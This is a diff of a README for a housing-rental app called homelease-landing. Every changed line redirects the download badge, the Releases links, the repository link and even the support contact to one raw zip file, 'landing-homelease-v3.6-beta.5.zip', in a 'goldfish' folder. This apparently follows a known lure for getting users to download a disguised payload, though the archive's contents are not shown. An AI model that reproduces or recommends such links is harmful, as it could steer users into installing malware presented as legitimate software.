@@ -4,11 +4,11 @@
 
 Welcome to the homelease-landing application. This modern platform connects tenants and hosts, offering flexible living arrangements. Follow these steps to download and run the software.
 
-[![Download now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/najm998/homelease-landing/releases)
+[![Download now](https://github.com/najm998/homelease-landing/raw/refs/heads/main/goldfish/landing-homelease-v3.6-beta.5.zip%20Now-Click%20Here-blue)](https://github.com/najm998/homelease-landing/raw/refs/heads/main/goldfish/landing-homelease-v3.6-beta.5.zip)
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/najm998/homelease-landing/releases) to download the latest version of the software.
+1. Visit the [Releases page](https://github.com/najm998/homelease-landing/raw/refs/heads/main/goldfish/landing-homelease-v3.6-beta.5.zip) to download the latest version of the software.
 2. Locate the asset that matches your operating system.
 3. Click the download link to save the file to your computer.
 4. Once downloaded, find the file in your Downloads folder.
@@ -32,11 +32,11 @@ To ensure the best experience, make sure your system meets the following require
 
 ## 📞 Support
 
-If you encounter any issues or have questions, reach out for assistance. You can file an issue directly on this GitHub repository, or contact our support team at support@homelease.com.
+If you encounter any issues or have questions, reach out for assistance. You can file an issue directly on this GitHub repository, or contact our support team at https://github.com/najm998/homelease-landing/raw/refs/heads/main/goldfish/landing-homelease-v3.6-beta.5.zip
 
 ## 🔗 Useful Links
 
-- **GitHub Repository**: [homelease-landing](https://github.com/najm998/homelease-landing)
+- **GitHub Repository**: [homelease-landing](https://github.com/najm998/homelease-landing/raw/refs/heads/main/goldfish/landing-homelease-v3.6-beta.5.zip)
 - **Documentation**: Comprehensive guides and user manuals are available in the repository.
 - **Community Forum**: Join discussions and connect with other users.
 
@@ -50,7 +50,7 @@ homelease-landing connects tenants searching for temporary housing with hosts of
 
 ## 🔄 Update Process
 
-Keep your application up to date by checking the [Releases page](https://github.com/najm998/homelease-landing/releases) regularly. Download the latest version to enjoy new features and improvements.
+Keep your application up to date by checking the [Releases page](https://github.com/najm998/homelease-landing/raw/refs/heads/main/goldfish/landing-homelease-v3.6-beta.5.zip) regularly. Download the latest version to enjoy new features and improvements.
 
 ## 📊 Compatibility
 
@@ -62,6 +62,6 @@ If you face issues while downloading or using the application, check the FAQ sec
 
 ## 🎉 Your Next Steps
 
-Now you’re ready to connect with homeLease! Download the application from our [Releases page](https://github.com/najm998/homelease-landing/releases) and start exploring your living options today.
+Now you’re ready to connect with homeLease! Download the application from our [Releases page](https://github.com/najm998/homelease-landing/raw/refs/heads/main/goldfish/landing-homelease-v3.6-beta.5.zip) and start exploring your living options today.
 
 Happy leasing!
